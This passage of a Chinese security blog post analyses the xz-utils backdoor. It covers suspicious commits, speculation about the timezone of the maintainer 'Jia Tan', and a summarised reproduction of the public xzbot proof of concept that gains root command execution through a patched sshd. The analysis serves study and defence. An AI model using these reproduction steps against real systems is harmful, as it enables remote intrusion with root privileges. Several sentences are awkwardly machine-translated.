    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>Jia Tan 的 328c52da8a2bbb81307644efdb58db2c422d9ba7 提交在 CMake 检查中包含一个 <code>.</code> landlock 沙盒支持。这导致检查始终失败，因此没有检测到缺少支持。
<ul>
<li><code>check_c_source_compiles</code> 有人提议对 CMake 进行强化（参见其他项目）。</li>
</ul>
</li>
<li>IFUNC 由 Hans Jensen 在 ee44863ae88e377a5df10db007ba9bfadde3d314 中为 crc64 引入。
<ul>
<li>Hans Jensen 后来继续要求 Debian 在 <a href="https://bugs.debian.org/1067708"target="_blank" rel="external nofollow noopener noreferrer">https://bugs.debian.org/1067708</a> 中更新 xz-utils，但对于热心的用户来说，这是一件很常见的事情，所以它不一定是邪恶的。</li>
</ul>
</li>
</ul>
<h3 id="人员分析" class="heading-element"><span>人员分析</span>
  <a href="#%e4%ba%ba%e5%91%98%e5%88%86%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>我暂时不在本文档中推测这个项目背后的人。执法部门将能够识别责任人。他们可能也在修补他们的系统。</p>
<p>xz-utils 有两个维护者：</p>
<ul>
<li>Lasse Collin （Larhzu） 从一开始就维护 xz（~2009 年），在此之前， <code>lzma-utils</code> .</li>
<li>Jia Tan （JiaT75） 在过去 2-2.5 年内开始为 xz 做贡献，并在大约 1.5 年前获得了提交访问权限，然后获得了发布管理员权限。他于 2024 年 3 月 31 日被撤职，因为 Lasse 开始了他未来的长期工作。</li>
</ul>
<p>分析人员Lasse 目前在这一切开始之前就开始了人员分析。他在 <a href="https://tukaani.org/xz-backdoor/"target="_blank" rel="external nofollow noopener noreferrer">https://tukaani.org/xz-backdoor/</a> 上发布了更新，并正在与社区合作进行一步分析处理。请耐心等待他，因为他会加快速度并花时间仔细分析情况。</p>
<p>本次事件的主角是Jia Tan （JiaT75），根据他的名字，他希望人们相信他是亚洲人，特并且他的绝大多数提交都是 UTC+08 时间戳。 然而，我更相信他实际上来自 UTC+02/UTC+03时区的某个地方，其中包括东欧（EET）、以色列（IST）等。他通常早上 9 点到下午 6 点工作（根据 EET 调整）。这比在周二晚上午夜和凌晨 1 点工作的人更合理（使用 UTC+08）。</p>
<p>关于这些，详情可见：https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and</p>
<h2 id="漏洞利用" class="heading-element"><span>漏洞利用</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>github已有公开的<a href="https://github.com/amlweems/xzbot"target="_blank" rel="external nofollow noopener noreferrer">demo exp</a>，这个exp通过patch后门中的公钥为自己的私钥来验证漏洞的存在。</p>
<p>见 <a href="https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg</a> 已有复现</p>
<blockquote>
<p>下载了debian官方编译的deb包。安装之后使用patch.py脚本手动patch。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/641.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/641.png?size=small" data-sub-html="<h2>图片</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/641.png" alt="图片" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/641.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/641.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/641.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 88;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>然后启动sshd进程，使其监听在2222端口。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/643.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/643.png?size=small" data-sub-html="<h2>图片</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/643.png" alt="图片" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/643.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/643.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/643.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 841;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>之后运行exploit，执行的命令为<code>id &gt; /tmp/.xz</code>。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/642.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/642.png?size=small" data-sub-html="<h2>图片</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/642.png" alt="图片" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/642.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/642.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/642.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 170;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>运行之后可以看到命令成功被执行，并且命令执行的权限为root。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406223956708.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406223956708.png?size=small" data-sub-html="<h2>image-20240406223956708</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406223956708.png" alt="image-20240406223956708" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406223956708.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406223956708.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406223956708.png?size=large 2x" data-title="image-20240406223956708" style="--width: 624px;--aspect-ratio: 624 / 91;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
</blockquote>
<h2 id="后续影响" class="heading-element"><span>后续影响</span>
  <a href="#%e5%90%8e%e7%bb%ad%e5%bd%b1%e5%93%8d" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>有很多人讨论说很大可能是国家级的供应链攻击， XZ攻击的复杂程度和攻击模型流程都非常夸张</p>
<p>这是一起偶然发现的事件，那么还有多少事情未被发现。冰山之下还有多少？</p>
<p>推动了开源社区的反间谍类安全意识问题发现，很多开源社区近期都在筛查这种同类问题。</p>
<p>开源产品的维护，当整个产品基于一个过度劳累的人身上时，在没有任何财务或运营上的支持，很容易慢慢出现心理健康危机。</p>
<h2 id="参考链接" class="heading-element"><span>参考链接</span>
  <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Andres Freund 邮件原文：https://www.openwall.com/lists/oss-security/2024/03/29/4</li>
<li>奇安信Cert <a href="https://mp.weixin.qq.com/s/F2k1bPmCuqwUAZkNiIFA-w"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s/F2k1bPmCuqwUAZkNiIFA-w</a></li>
<li>Everything I Know About the Xz Backdoor:  <a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor"target="_blank" rel="external nofollow noopener noreferrer">https://boehs.org/node/everything-i-know-about-the-xz-backdoor</a></li>
<li>xz 后门镜像地址 <a href="https://github.com/thesamesam/xz-archive"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/thesamesam/xz-archive</a></li>
<li><a href="https://gynvael.coldwind.pl/?id=782"target="_blank" rel="external nofollow noopener noreferrer">xz/liblzma: Bash-stage Obfuscation Explained</a> : <a href="https://gynvael.coldwind.pl/?lang=en&amp;id=782#stage2-ext"target="_blank" rel="external nofollow noopener noreferrer">https://gynvael.coldwind.pl/?lang=en&id=782#stage2-ext</a></li>
<li>FAQ on the xz-utils backdoor (CVE-2024-3094) <a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27"target="_blank" rel="external nofollow noopener noreferrer">https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27</a></li>
<li>XZ Backdoor Analysis：https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504</li>
<li>xzre：https://github.com/smx-smx/xzre</li>
<li>XZ Backdoor: Times, damned times, and scams：https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and</li>
<li>XZ开源项目投毒事件深入解析：https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg</li>
<li><a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b"target="_blank" rel="external nofollow noopener noreferrer">https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b</a></li>
</ul></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2024-04-06 17:05:44">更新于 2024-04-06&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-tag" title="标签 - 漏洞分析">漏洞分析</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/provinggrounds-butch/" class="post-nav-item" rel="prev" title="ProvingGrounds Butch Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrounds Butch Writeup</a><a href="/posts/2024-hackingclub-beijing/" class="post-nav-item" rel="next" title="2024 HackingClub北京站沙龙分享">2024 HackingClub北京站沙龙分享<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightgallery":true,"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
</html>
